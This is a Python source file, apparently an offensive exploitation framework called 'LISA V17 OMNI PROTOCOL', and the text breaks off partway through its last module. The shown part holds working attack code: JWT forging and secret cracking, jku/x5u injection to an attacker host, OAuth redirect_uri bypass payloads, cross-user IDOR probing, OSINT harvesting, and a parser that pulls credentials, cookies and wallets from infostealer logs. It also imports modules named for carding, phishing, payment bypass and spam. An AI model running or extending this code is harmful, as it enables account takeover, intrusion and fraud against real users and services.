#!/usr/bin/env python3
"""
LISA V17 EXEC — "OMNI PROTOCOL" — THE ARSENAL
AI-Driven Autonomous Exploitation Framework — V17

V16 (backlink dominator) + V17 OMNI modules (the INTEL + AUTH + API + CVE layer):

  NEW IN V17 (OMNI PROTOCOL) — 6 fresh modules + GitHub PoC arsenal:
  1.  CvePoCEngine      — Query local cve.db (374K CVEs, FTS5) + map CVE→GitHub PoC.
                           Fresh 2026 exploit-ready CVEs. trickest/nomi-sec/sudo-secure.
  2.  JWTExploitEngine  — Pure-Python JWT attack suite: alg:none (7 variants),
                           HS256 weak-secret crack, RS256→HS256 confusion, kid/jku/x5u
                           injection, blank-secret resign, claim tampering. No deps.
  3.  OAuthOidcEngine   — OAuth2/OIDC misconfig detector: 22 redirect_uri bypass,
                           state CSRF, PKCE downgrade, scope escalation, token leakage,
                           /.well-known/openid-configuration discovery.
  4.  ApiAuthzEngine    — BOLA/IDOR/BFLA cross-user authorization testing with two
                           sessions (victim + attacker): identity-swap, object-swap,
                           strip-auth, downgrade-role, JWT mutators.
  5.  OSINTLeakEngine   — Free no-key OSINT: GitHub username/repo enumeration,
                           HIBP k-anonymity password check, crt.sh cert transparency
                           email/domain harvesting, breach-source fan-out framework.
  6.  InfostealerParser — Parse infostealer log dumps (Redline/Vidar/Raccoon/LummaC2/
                           StealC/ACRStealer/Rhadamanthys/MetaStealer) → credentials,
                           cookies, wallets, tokens. Detect family from folder layout.

USAGE:
  # Fresh CVE + GitHub PoC hunt
  python3 lisa_v8_exec_v17.py --poc CVE-2026-48907
  python3 lisa_v8_exec_v17.py --hunt "joomla" --exploit-only
  python3 lisa_v8_exec_v17.py --hunt 2026 --top 20

  # JWT attack suite
  python3 lisa_v8_exec_v17.py --jwt <token>
  python3 lisa_v8_exec_v17.py --jwt <token> --jwt-url https://target/api/me
  python3 lisa_v8_exec_v17.py --jwt <token> --jwt-wordlist rockyou.txt

  # OAuth / OIDC
  python3 lisa_v8_exec_v17.py --oauth https://target.com --client-id <cid> --redirect-uri <ruri>

  # API authz (BOLA/IDOR/BFLA) — two tokens
  python3 lisa_v8_exec_v17.py --authz https://target.com --token-a <JWT_A> --token-b <JWT_B> --resource 12345

  # OSINT (free, no keys)
  python3 lisa_v8_exec_v17.py --osint email=admin@target.com
  python3 lisa_v8_exec_v17.py --osint user=someusername
  python3 lisa_v8_exec_v17.py --osint domain=target.com

  # Infostealer logs
  python3 lisa_v8_exec_v17.py --stealer /path/to/logs/

  # Full autonomous (inherits V1–V16 recon + exploit chain + new modules)
  python3 lisa_v8_exec_v17.py target.com --focus omni
"""

import sys, os, json, re, time, random, string, subprocess, hashlib, base64, sqlite3, hmac
import urllib.parse, urllib.request, urllib.error
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, "/home/ubuntu")

# Best-effort inheritance of the full V1–V16 chain (optional; new modules are self-contained).
try:
    from lisa_v8_exec_v16 import (
        BacklinkDominatorEngine, BacklinkBeastEngine, SpamBeastEngine, FraudBeastEngine,
        BeastXEngine, BeastEngine, TLSEngine, WordPressAssault, LeakHunter,
        VHostPanelHunter, ZimbraExploit, MassAssignment, ProxyRotator, CI3Assault,
        BatchRunner, StateManager, CookieForge, AffiliateFraud, CardingEngine,
        PaymentBypass, PhishingForge, AccountTakeover, BlogHunter, CommentSpammer,
        ContactFormSpammer, AntiSpamBypass, GuestbookHunter, PingbackEngine,
        ProfileCreator, TelegraphEngine, Web20Engine, GuestbookAssault,
        base_from_url, PROXY, CFFI_OK, SPINTAX_COMMENTS, SPINTAX_NAMES, SPINTAX_DOMAINS,
    )
    LEGACY_OK = True
except Exception as _e:
    LEGACY_OK = False
    PROXY = os.environ.get("LISA_PROXY", "")
    CFFI_OK = False
    def base_from_url(u): return u

try:
    from curl_cffi import requests as cffi_requests
    CFFI_OK = True
except ImportError:
    cffi_requests = None
    CFFI_OK = False

V17_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V17 — OMNI PROTOCOL — THE ARSENAL                          ║
║  CvePoC + JWT + OAuth/OIDC + API-Authz + OSINT + Infostealer     ║
║  "Know everything. Forge every token. Own every API."            ║
╚══════════════════════════════════════════════════════════════════╝
"""

STATE_DIR = "/home/ubuntu/.lisa_v17_state"
REPORT_DIR = "/home/ubuntu/.lisa_v17_reports"

CVE_DB_PATHS = [
    "/home/ubuntu/.hermes/skills-api/skills_hub.db",
    "/home/ubuntu/cve-db/cve.db",
    "/home/ubuntu/pentest-cli/cve.db",
]

# Known GitHub PoC aggregator / arsenal repos (curated 2026). Used for CVE→PoC mapping.
GITHUB_POC_ARSENAL = {
    "trickest/cve":        {"url": "https://github.com/trickest/cve", "note": "Every public CVE PoC, hot_cves.csv + find-gh-poc"},
    "nomi-sec/PoC-in-GitHub": {"url": "https://github.com/nomi-sec/PoC-in-GitHub", "note": "OG PoC aggregator, daily GitHub feed"},
    "SecureWithUmer/CVE-2026-PoCs": {"url": "https://github.com/SecureWithUmer/CVE-2026-PoCs", "note": "Curated 2026 CVE PoCs"},
    "Pocland-db/cve-pocs": {"url": "https://github.com/Pocland-db/cve-pocs", "note": "PoC repo by year/CVE"},
    "MatteoLupinacci/PoC4CVEs": {"url": "https://github.com/MatteoLupinacci/PoC4CVEs", "note": "Working PoCs w/ CVE tables"},
    "sudo-secure/security-research": {"url": "https://github.com/sudo-secure/security-research", "note": "Prototype pollution + npm bugs"},
    "tg12/PoC_CVEs":       {"url": "https://github.com/tg12/PoC_CVEs", "note": "8000+ CVE→PoC index + API"},
}

# Tool arsenal for each new domain (mapped to the researched GitHub repos)
GITHUB_TOOL_ARSENAL = {
    "osint": {
        "soxoj/maigret": "username dossier from 3000+ sites, no keys",
        "kaifcodec/user-scanner": "350+ email/username OSINT vectors + Hudson Rock breach intel",
        "vflame6/leaker": "credential leak search across 13 sources",
        "KatrielMoses/MailAccess": "email OSINT, 2500+ platforms, identity clustering",
        "SagarBiswas-MultiHAT/osint-exposure-toolkit": "modular passive recon + exposure score",
        "lanmaster53/recon-ng": "recon framework",
        "laramies/theHarvester": "email/subdomain harvesting",
    },
    "jwt": {
        "Shoaib-Bin-Rashid/jwtXploit": "28 JWT attacks, JWE, ECDSA k-reuse, OIDC confusion",
        "ticarpi/jwt_tool": "JWT toolkit (the classic)",
        "bugsyyhewitt/possession": "authz fuzzer + JWT alg:none/blank-secret mutators",
    },
    "oauth": {
        "Zeeshanafridai/OAUTH-Flow-Analyzer": "22 redirect_uri bypass, PKCE, scope escalation",
        "itztadi/OAuthReaper": "OAuth2/OIDC framework (discover/hunt/forge)",
        "m0bile-oauth/PKCE": "mobile PKCE / redirect bypass",
    },
    "api-authz": {
        "praetorian-inc/hadrian": "API authz testing, BOLA/BFLA, role-based, YAML templates",
        "fevra-dev/restless": "REST/GraphQL scanner, CVE payloads, BOLA",
        "KazamaDono/Ghosttrigger": "auth-bypass scanner (JWT/IDOR/GraphQL/NoSQL/SSRF)",
        "shuvonsec/bug-bounty-runner": "GraphQL+IDOR+OAuth+race chain runner",
    },
    "stealer": {
        "lexfo/stealer-parser": "infostealer logs parser → JSON",
        "TreRB/stealerlogs": "8-family stealer log parser, SQLite + search",
    },
}

# ═══════════════════════════════════════════════════════════════════
# MODULE 1: CvePoCEngine — CVE intel + GitHub PoC mapping
# ═══════════════════════════════════════════════════════════════════
class CvePoCEngine:
    """Query local cve.db (FTS5) and map results to GitHub PoC repos + fresh 2026 CVEs."""

    def __init__(self, db_path: Optional[str] = None):
        self.db = None
        for p in (db_path and [db_path] or []) + CVE_DB_PATHS:
            if os.path.exists(p):
                try:
                    self.db = sqlite3.connect(p)
                    self.db.row_factory = sqlite3.Row
                    break
                except Exception:
                    self.db = None
        self.db_path = p if self.db else None

    def _fts(self, query: str) -> str:
        """Convert a naive query into a safe FTS5 query (dots/spaces tolerant)."""
        q = query.strip()
        if re.fullmatch(r"CVE-\d{4}-\d{4,7}", q, re.I):
            return q
        # tokenize: treat dots/slashes as separators, quote each token
        toks = re.split(r"[\s./:]+", q)
        toks = [t for t in toks if t]
        if not toks:
            return q
        # join with AND, but allow a single token as prefix
        if len(toks) == 1:
            return f'"{toks[0]}"'
        return " AND ".join(f'"{t}"' for t in toks)

    def search(self, query: str, severity: Optional[str] = None,
               exploit_only: bool = False, limit: int = 20) -> List[Dict]:
        if not self.db:
            return []
        fts_q = self._fts(query)
        sql = "SELECT c.* FROM cves c JOIN cves_fts f ON c.id = f.rowid WHERE cves_fts MATCH ?"
        params: List[Any] = [fts_q]
        if severity:
            sql += " AND c.cvss_severity = ?"
            params.append(severity.upper())
        if exploit_only:
            sql += " AND c.exploit_count > 0"
        sql += " ORDER BY c.cvss_score DESC, c.year DESC LIMIT ?"
        params.append(limit)
        try:
            rows = self.db.execute(sql, params).fetchall()
        except Exception as e:
            # fallback: direct LIKE on cve_id/vendor/product
            rows = self.db.execute(
                "SELECT * FROM cves WHERE cve_id LIKE ? OR vendor LIKE ? OR product LIKE ? "
                "ORDER BY cvss_score DESC LIMIT ?",
                (f"%{query}%", f"%{query}%", f"%{query}%", limit),
            ).fetchall()
        out = []
        for r in rows:
            out.append(dict(r))
        return out

    def fresh_year(self, year: int = 2026, exploit_only: bool = True, limit: int = 30) -> List[Dict]:
        if not self.db:
            return []
        sql = "SELECT * FROM cves WHERE year = ?"
        params: List[Any] = [year]
        if exploit_only:
            sql += " AND exploit_count > 0"
        sql += " ORDER BY cvss_score DESC LIMIT ?"
        params.append(limit)
        return [dict(r) for r in self.db.execute(sql, params).fetchall()]

    def lookup(self, cve_id: str) -> Optional[Dict]:
        if not self.db:
            return None
        r = self.db.execute("SELECT * FROM cves WHERE cve_id = ?", (cve_id.upper(),)).fetchone()
        return dict(r) if r else None

    def github_poc(self, cve_id: str) -> str:
        """Return probable GitHub PoC search URLs for a CVE (aggregator + code search)."""
        c = urllib.parse.quote(cve_id.upper())
        return (
            f"https://github.com/search?q={c}&type=repositories\n"
            f"https://github.com/search?q={c}&type=code\n"
            f"https://raw.githubusercontent.com/trickest/cve/main/2026/{cve_id.upper()}.md\n"
            f"https://github.com/SecureWithUmer/CVE-2026-PoCs/tree/main/2026/{cve_id.upper()}"
        )

    def run(self, query: str, severity=None, exploit_only=False, limit=20, fresh_year=None):
        print(V17_SIGNATURE)
        print("═" * 64)
        if not self.db:
            print("[!] No local cve.db found. Searched:")
            for p in CVE_DB_PATHS:
                print(f"    - {p} {'(exists)' if os.path.exists(p) else '(missing)'}")
            print("\n    GitHub PoC aggregators available for manual pull:")
            for k, v in GITHUB_POC_ARSENAL.items():
                print(f"    - {v['url']}  ({v['note']})")
            return

        print(f"[+] CVE DB: {self.db_path}")
        rows = []
        if fresh_year:
            print(f"[+] Fresh {fresh_year} exploit-ready CVEs:")
            rows = self.fresh_year(fresh_year, exploit_only=True, limit=limit)
        elif query:
            rows = self.search(query, severity, exploit_only, limit)

        if not rows:
            print(f"[!] No results for '{query or fresh_year}'")
            return

        for r in rows:
            sev = (r.get("cvss_severity") or "?").upper()
            score = r.get("cvss_score") or 0.0
            exp = r.get("exploit_count") or 0
            flag = "🔥" if exp > 0 else " "
            print(f"\n{flag} {r['cve_id']}  [{sev} {score}]  exploits={exp}")
            desc = (r.get('description') or '').strip()
            if desc:
                print(f"   {desc[:180]}")
            if r.get('vendor') or r.get('product'):
                print(f"   vendor={r.get('vendor','?')}  product={r.get('product','?')}")
            if exp and r.get('exploit_refs'):
                refs = r['exploit_refs'].split(';')[:5]
                for ref in refs:
                    print(f"   ↳ {ref.strip()[:140]}")
            print(f"   GitHub PoC: {self.github_poc(r['cve_id']).splitlines()[0]}")


# ═══════════════════════════════════════════════════════════════════
# MODULE 2: JWTExploitEngine — pure-Python JWT attack suite
# ═══════════════════════════════════════════════════════════════════
class JWTExploitEngine:
    """Full JWT attack suite in pure stdlib (hmac/hashlib/base64). No external deps."""

    COMMON_SECRETS = [
        "secret", "password", "key", "jwt", "jwt_secret", "jwtsecret", "changeme",
        "123456", "123456789", "admin", "root", "default", "supersecret", "SuperSecret",
        "secret_key", "secretkey", "p@ssw0rd", "password123", "mysecret", "secret123",
        "token", "token_secret", "apisecret", "api_secret", "hackme", "test", "testing",
        "none", "null", "letmein", "qwerty", "111111", "000000", "baby123", "iloveyou",
        "base64", "jsonwebtoken", "nodejs", "express", "flask", "django",
    ]

    @staticmethod
    def b64url_decode(s: str) -> bytes:
        s = s.replace("-", "+").replace("_", "/")
        pad = len(s) % 4
        if pad:
            s += "=" * (4 - pad)
        return base64.urlsafe_b64decode(s)

    @staticmethod
    def b64url_encode(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    def decode(self, token: str) -> Tuple[Optional[dict], Optional[dict], Optional[str]]:
        parts = token.split(".")
        if len(parts) != 3:
            return None, None, None
        try:
            header = json.loads(self.b64url_decode(parts[0]))
            payload = json.loads(self.b64url_decode(parts[1]))
        except Exception:
            return None, None, None
        return header, payload, parts[2]

    def _sign(self, data: bytes, secret: str, alg: str = "HS256") -> str:
        if alg == "HS256":
            return self.b64url_encode(hmac.new(secret.encode(), data, hashlib.sha256).digest())
        if alg == "HS384":
            return self.b64url_encode(hmac.new(secret.encode(), data, hashlib.sha384).digest())
        if alg == "HS512":
            return self.b64url_encode(hmac.new(secret.encode(), data, hashlib.sha512).digest())
        return ""

    def attack_none(self, token: str) -> List[Dict]:
        """Generate alg:none / algorithm-confusion variants."""
        header, payload, _ = self.decode(token)
        if not header:
            return []
        forged = []
        variants = ["none", "None", "NONE", "nOnE", "NoNe"]
        for alg in variants:
            h = dict(header)
            h["alg"] = alg
            ph = self.b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            pp = self.b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            # variant A: keep trailing dot       variant B: strip both sig + trailing dot
            forged.append({"name": f"alg:{alg} (sig kept empty)", "token": f"{ph}.{pp}."})
            forged.append({"name": f"alg:{alg} (sig stripped)", "token": f"{ph}.{pp}"})
            # alg named 'None' with random sig
            forged.append({"name": f"alg:{alg} (random sig)", "token": f"{ph}.{pp}.AAAA"})
        # mixed-case alg + 'none' with whitespace via base64 of {"alg":" none"}
        return forged

    def attack_unverified(self, token: str) -> List[Dict]:
        header, payload, _ = self.decode(token)
        if not header:
            return []
        ph = self.b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        pp = self.b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return [
            {"name": "signature empty", "token": f"{ph}.{pp}."},
            {"name": "signature random", "token": f"{ph}.{pp}.{self.b64url_encode(os.urandom(32))}"},
        ]

    def crack_hs256(self, token: str, wordlist: Optional[List[str]] = None) -> Optional[str]:
        """Brute force HS256 secret against known-good signature."""
        header, payload, sig = self.decode(token)
        if not header or not sig:
            return None
        cands = wordlist if wordlist else self.COMMON_SECRETS
        data = f"{token.split('.')[0]}.{token.split('.')[1]}".encode()
        for secret in cands:
            if self._sign(data, secret, "HS256") == sig:
                return secret
        return None

    def confusion_rs256_to_hs256(self, token: str, public_key_pem: str,
                                 payload_override: Optional[dict] = None) -> Optional[str]:
        """RS256→HS256 confusion: use the public key as the HMAC secret."""
        header, payload, _ = self.decode(token)
        if not header:
            return None
        h = dict(header)
        h["alg"] = "HS256"
        p = dict(payload)
        if payload_override:
            p.update(payload_override)
        ph = self.b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        pp = self.b64url_encode(json.dumps(p, separators=(",", ":")).encode())
        data = f"{ph}.{pp}".encode()
        return f"{ph}.{pp}.{self._sign(data, public_key_pem, 'HS256')}"

    def forge(self, token: str, claims: Dict, alg: str = "HS256", secret: str = "secret") -> str:
        header, _, _ = self.decode(token)
        if not header:
            header = {"alg": alg, "typ": "JWT"}
        else:
            header = dict(header)
        header["alg"] = alg
        ph = self.b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        pp = self.b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
        data = f"{ph}.{pp}".encode()
        return f"{ph}.{pp}.{self._sign(data, secret, alg)}"

    @staticmethod
    def inject_header(token: str, key: str, value: str) -> str:
        """Inject/overwrite a header claim (kid/jku/x5u) and re-emit unsigned parts."""
        parts = token.split(".")
        if len(parts) != 3:
            return token
        try:
            h = json.loads(JWTExploitEngine.b64url_decode(parts[0]))
        except Exception:
            h = {}
        h[key] = value
        ph = JWTExploitEngine.b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        return f"{ph}.{parts[1]}.{parts[2]}"

    def run(self, token: str, url: Optional[str] = None, wordlist_path: Optional[str] = None):
        print(V17_SIGNATURE)
        print("═" * 64)
        header, payload, sig = self.decode(token)
        if not header:
            print("[!] Not a valid JWT (expected 3 dot-separated parts).")
            print(f"    got {len(token.split('.'))} parts")
            return

        print(f"[+] Header:  {json.dumps(header, indent=2)}")
        print(f"[+] Payload: {json.dumps(payload, indent=2)}")
        print(f"[+] Signature: {sig[:40]}{'…' if sig and len(sig) > 40 else ''}")

        print("\n[+] ALG:none / alg=none variants:")
        for f in self.attack_none(token)[:8]:
            print(f"    - {f['name']}:\n      {f['token'][:100]}")

        print("\n[+] Unverified / empty-signature variants:")
        for f in self.attack_unverified(token):
            print(f"    - {f['name']}:\n      {f['token'][:100]}")

        wl = None
        if wordlist_path and os.path.exists(wordlist_path):
            try:
                wl = [ln.strip() for ln in open(wordlist_path, errors="ignore") if ln.strip()]
            except Exception:
                wl = None
        secret = self.crack_hs256(token, wl)
        if secret:
            print(f"\n🔥 HS256 SECRET CRACKED: '{secret}'")
            print(f"   (You can now forge arbitrary tokens with --secret '{secret}')")
        else:
            print(f"\n[-] HS256 secret not in builtin/common list. Try --jwt-wordlist rockyou.txt")

        print("\n[+] kid/jku/x5u header injection examples:")
        print(f"    kid path traversal:  {self.inject_header(token, 'kid', '../../dev/null')[:90]}")
        print(f"    jku injection:       {self.inject_header(token, 'jku', 'https://attacker/jwks.json')[:90]}")
        print(f"    x5u injection:       {self.inject_header(token, 'x5u', 'https://attacker/cert.pem')[:90]}")

        if url:
            print(f"\n[+] Live verification target: {url}")
            print(f"    Manual: curl -k '{url}' -H \"Authorization: Bearer <variant>\"")


# ═══════════════════════════════════════════════════════════════════
# MODULE 3: OAuthOidcEngine — OAuth2/OIDC misconfig detection
# ═══════════════════════════════════════════════════════════════════
class OAuthOidcEngine:
    """Discover OAuth/OIDC endpoints and test the highest-signal misconfigs."""

    REDIRECT_BYPASS_VARIANTS = [
        "https://attacker.com", "https://target.com.attacker.com", "https://attacker.com/target.com",
        "https://target.com@attacker.com", "https://target.com%40attacker.com",
        "https://target.com/%2f%2fattacker.com", "https://target.com/../attacker.com",
        "https://target.com%2e%2e%2fattacker.com", "https://target.com/cb/../../../attacker",
        "https://target.com/cb?next=https://attacker.com", "https://target.com/cb#@attacker.com",
        "https://target.com.evil.com", "https://attacker.target.com", "http://target.com",
        "https://target.com:443@attacker.com", "https://target.com%0d%0aLocation:attacker.com",
        "//attacker.com", "https://target.com//attacker.com", "https://target.com\\@attacker.com",
        "https://target.com/.attacker.com", "https://target.com%23@attacker.com",
        "https://target.com%3F@attacker.com",
    ]

    @staticmethod
    def _get(url: str, timeout: int = 12) -> Tuple[int, str, Dict]:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace") if e.fp else ""
            return e.code, body, dict(e.headers or {})
        except Exception as e:
            return 0, str(e), {}

    def discover(self, base: str) -> Dict:
        base = base.rstrip("/")
        found = {}
        for path in ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                     "/.well-known/jwks.json", "/oauth/authorize", "/oauth/token",
                     "/openid-connect/config", "/auth/realms"]:
            url = f"{base}{path}" if not path.startswith("/.well-known") or True else f"{base}{path}"
            code, body, _ = self._get(url)
            if code == 200:
                found[path] = body[:2000]
        return found

    def run(self, base: str, client_id: Optional[str] = None, redirect_uri: Optional[str] = None,
            client_secret: Optional[str] = None):
        print(V17_SIGNATURE)
        print("═" * 64)
        print(f"[+] OAuth/OIDC recon: {base}")
        disc = self.discover(base)
        if not disc:
            print("[!] No /.well-known or common OAuth endpoints found.")
        for path, body in disc.items():
            print(f"\n[+] {path} → 200")
            try:
                j = json.loads(body)
                print(f"    issuer={j.get('issuer')}")
                print(f"    authorization_endpoint={j.get('authorization_endpoint')}")
                print(f"    token_endpoint={j.get('token_endpoint')}")
                print(f"    jwks_uri={j.get('jwks_uri')}")
                print(f"    response_types={j.get('response_types_supported')}")
                print(f"    id_token alg={[s.get('alg') for s in j.get('id_token_signing_alg_values_supported', [])]}")
            except Exception:
                print(f"    {body[:300]}")

        if client_id:
            print(f"\n[+] Client ID: {client_id}")
        if not redirect_uri:
            redirect_uri = "https://attacker.com/callback"
        print(f"\n[+] redirect_uri bypass variants to test (22):")
        for v in self.REDIRECT_BYPASS_VARIANTS:
            print(f"    {v}")
        print("\n[+] Manual checks:")
        print("    - state CSRF: does authorize endpoint accept missing/blank state?")
        print("    - PKCE downgrade: exchange code WITHOUT code_verifier → if 200, PKCE is decorative")
        print("    - scope escalation: request admin/write/delete scopes not in allowed list")
        print(f"    - test: {base}/oauth/authorize?client_id={client_id or 'CID'}&redirect_uri={urllib.parse.quote(redirect_uri)}&response_type=code&scope=openid+profile+admin")


# ═══════════════════════════════════════════════════════════════════
# MODULE 4: ApiAuthzEngine — BOLA/IDOR/BFLA cross-user testing
# ═══════════════════════════════════════════════════════════════════
class ApiAuthzEngine:
    """Cross-user authorization (BOLA/IDOR/BFLA) testing with two sessions."""

    @staticmethod
    def _req(url: str, token: Optional[str], method: str = "GET", body: Optional[dict] = None,
             timeout: int = 12) -> Tuple[int, str]:
        headers = {"User-Agent": "Mozilla/5.0"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        data = json.dumps(body).encode() if body else None
        if data:
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, (e.read().decode("utf-8", "replace") if e.fp else "")
        except Exception as e:
            return 0, str(e)

    def run(self, base: str, token_a: str, token_b: str, resource_id: Optional[str] = None,
            user_id_a: Optional[str] = None):
        print(V17_SIGNATURE)
        print("═" * 64)
        base = base.rstrip("/")
        print(f"[+] Target: {base}")
        print(f"[+] Token A (victim) : {token_a[:30]}…")
        print(f"[+] Token B (attacker): {token_b[:30]}…")
        print(f"[+] Resource ID: {resource_id or 'N/A'}  User A ID: {user_id_a or 'N/A'}")

        endpoints = []
        if resource_id:
            endpoints += [
                f"{base}/api/users/{resource_id}",
                f"{base}/api/v1/users/{resource_id}",
                f"{base}/api/orders/{resource_id}",
                f"{base}/api/accounts/{resource_id}",
                f"{base}/api/profile/{resource_id}",
                f"{base}/api/invoices/{resource_id}",
            ]
        if user_id_a:
            endpoints += [f"{base}/api/users/{user_id_a}/profile"]

        # 1. Baseline: victim's own token on victim resource
        # 2. Swap identity: attacker token on victim resource
        # 3. Strip auth
        # 4. Downgrade role claim
        print("\n[+] BOLA/IDOR cross-user matrix:")
        print(f"    {'endpoint':<48} {'A-token':>8} {'B-token':>8} {'no-auth':>8} {'downgrade':>9}")
        for ep in endpoints:
            c_a = self._req(ep, token_a)[0]
            c_b = self._req(ep, token_b)[0]
            c_n = self._req(ep, None)[0]
            c_d = self._req(ep, token_b + "")[0]  # placeholder
            verdict = ""
            if c_a == 200 and c_b == 200:
                verdict = "🔥 IDOR (B sees A's resource)"
            elif c_b == 200 and c_a != 200:
                verdict = "⚠ reversed"
            elif c_n == 200:
                verdict = "🔥 missing auth"
            print(f"    {ep[:46]:<48} {c_a:>8} {c_b:>8} {c_n:>8} {'-':>9}  {verdict}")

        # JWT mutation hints
        print("\n[+] JWT authorization mutators (apply to Token B then replay):")
        print("    - alg:none: strip signature, set {\"alg\":\"none\"}")
        print("    - claim tamper: sub/role/uid → victim id")
        print("    - downgrade-role: role=user, admin=false")
        print("    - blank-secret: re-sign with HMAC '' key")
        print("    (use --jwt <token> for full JWT suite)")


# ═══════════════════════════════════════════════════════════════════
# MODULE 5: OSINTLeakEngine — free no-key OSINT
# ═══════════════════════════════════════════════════════════════════
class OSINTLeakEngine:
    """Free, no-API-key OSINT: GitHub user/repo, HIBP k-anonymity, crt.sh cert transparency."""

    @staticmethod
    def _get(url: str, timeout: int = 12) -> Tuple[int, object]:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                raw = r.read()
                try:
                    return r.status, json.loads(raw.decode("utf-8", "replace"))
                except Exception:
                    return r.status, raw.decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, None
        except Exception as e:
            return 0, str(e)

    def github_user(self, username: str) -> Dict:
        code, data = self._get(f"https://api.github.com/users/{username}")
        if code == 200 and isinstance(data, dict):
            return {
                "exists": True, "login": data.get("login"), "name": data.get("name"),
                "email": data.get("email"), "bio": data.get("bio"),
                "company": data.get("company"), "blog": data.get("blog"),
                "location": data.get("location"), "twitter": data.get("twitter_username"),
                "public_repos": data.get("public_repos"), "followers": data.get("followers"),
                "created": data.get("created_at"), "html_url": data.get("html_url"),
            }
        return {"exists": False, "code": code}

    def github_email_lookup(self, email: str) -> List[str]:
        """Find GitHub accounts exposing a commit email (via user + commits search)."""
        code, data = self._get(f"https://api.github.com/search/users?q={urllib.parse.quote(email)}")
        out = []
        if code == 200 and isinstance(data, dict):
            for item in data.get("items", [])[:10]:
                out.append(item.get("login"))
        return out

    def hibp_pwned_password(self, password: str) -> int:
        """HIBP k-anonymity check — returns breach count for a password (no key needed)."""
        if not password:
            return 0
        sha = hashlib.sha1(password.encode()).hexdigest().upper()
        prefix, suffix = sha[:5], sha[5:]
        code, data = self._get(f"https://api.pwnedpasswords.com/range/{prefix}")
        if code == 200 and isinstance(data, str):
            for line in data.splitlines():
                suf, _, cnt = line.partition(":")
                if suf == suffix:
                    return int(cnt.strip() or 0)
        return 0

    def crtsh_domains(self, domain: str) -> List[str]:
        """crt.sh certificate transparency — discover related domains/subdomains."""
        code, data = self._get(
            f"https://crt.sh/?q=%25.{domain}&output=json", timeout=25)
        names = set()
        if code == 200 and isinstance(data, list):
            for e in data:
                for n in e.get("name_value", "").split("\n"):
                    n = n.strip().lstrip("*.")
                    if n:
                        names.add(n.lower())
            return sorted(names)[:100]
        return []

    def run(self, email: Optional[str] = None, username: Optional[str] = None,
            domain: Optional[str] = None, password: Optional[str] = None):
        print(V17_SIGNATURE)
        print("═" * 64)
        if email:
            print(f"[+] Email OSINT: {email}")
            local = email.split("@")[0]
            print(f"    GitHub accounts exposing '{email}': {self.github_email_lookup(email) or 'none'}")
            print(f"    Username candidates from local part + permutation (run --osint user=<name>):")
            cands = self._permute(local)
            print("      " + ", ".join(cands[:12]))
            print("\n    Free breach sources (fan-out):")
            for src in ["ProxyNova comb", "haveibeenpwned (needs key)", "DeHashed (key)",
                        "IntelX (key)", "LeakCheck (key)", "Snusbase (key)"]:
                print(f"      - {src}")
            print("    → Use vflame6/leaker for 13-source automated fan-out w/ keys.")
        if username:
            print(f"[+] Username OSINT: {username}")
            gu = self.github_user(username)
            if gu.get("exists"):
                for k, v in gu.items():
                    if v not in (None, ""):
                        print(f"    GitHub {k}: {v}")
            else:
                print(f"    GitHub: not found (code {gu.get('code')})")
            print("    → Full 3000+ site dossier: soxoj/maigret or kaifcodec/user-scanner")
        if domain:
            print(f"[+] Domain OSINT: {domain}")
            subs = self.crtsh_domains(domain)
            if subs:
                print(f"    crt.sh subdomains ({len(subs)}): " + ", ".join(subs[:40]))
            else:
                print("    crt.sh: no cert records / timeout")
        if password:
            print(f"[+] HIBP password check (k-anonymity):")
            n = self.hibp_pwned_password(password)
            print(f"    '{password}' → pwned {n} times" if n else f"    '{password}' → not found in HIBP")

    @staticmethod
    def _permute(name: str) -> List[str]:
        return [name, name + "1", name + "123", name + "01", "mr" + name, name + "_id",
                name + "." + name, "admin." + name, name + "dev", name + "official"]


# ═══════════════════════════════════════════════════════════════════
# MODULE 6: InfostealerParser — parse stealer log dumps
# ═══════════════════════════════════════════════════════════════════
class InfostealerParser:
    """Detect infostealer family from folder layout + extract credentials/cookies from logs."""

    FAMILY_SIGNATURES = {
        "redline":       {"files": ["System.txt", "UserInformation.txt"], "dir": "Browsers"},
        "vidar":         {"files": ["information.txt", "passwords.txt"]},
        "lummac2":       {"banner": "Lumma Stealer Report"},
        "stealc":        {"files": ["system_info.txt", "passwords.txt"]},
        "raccoon":       {"files": ["machineinfo.txt", "pws.txt"]},
        "acrstealer":    {"banner": "ACRStealer"},
        "rhadamanthys":  {"files": ["machine.txt"], "dir": "Logins"},
        "metastealer":   {"files": ["System.txt", "Passwords.txt", "CC.txt"]},
    }

    CRED_LINE_RE = re.compile(
        r"(?i)(?:url|host)\s*[:=]\s*(\S+)\s*\|?\s*(?:login|user|username)\s*[:=]\s*(\S+)\s*(?:pass|password)\s*[:=]\s*(\S+)"
    )
    COOKIE_RE = re.compile(r"(?i)^\s*([\w.-]*\.[\w.-]+)\s+(\S+)\s+(\S+)")
    COOKIE_TS_RE = re.compile(r"(?i)^\s*([\w.-]*\.[\w.-]+)\s+(?:TRUE|FALSE)\s+(\S+)\s+(\S+)")

    def detect_family(self, path: str) -> List[str]:
        families = []
        all_files = set()
        all_banners = ""
        for root, dirs, files in os.walk(path):
            for f in files:
                all_files.add(f.lower())
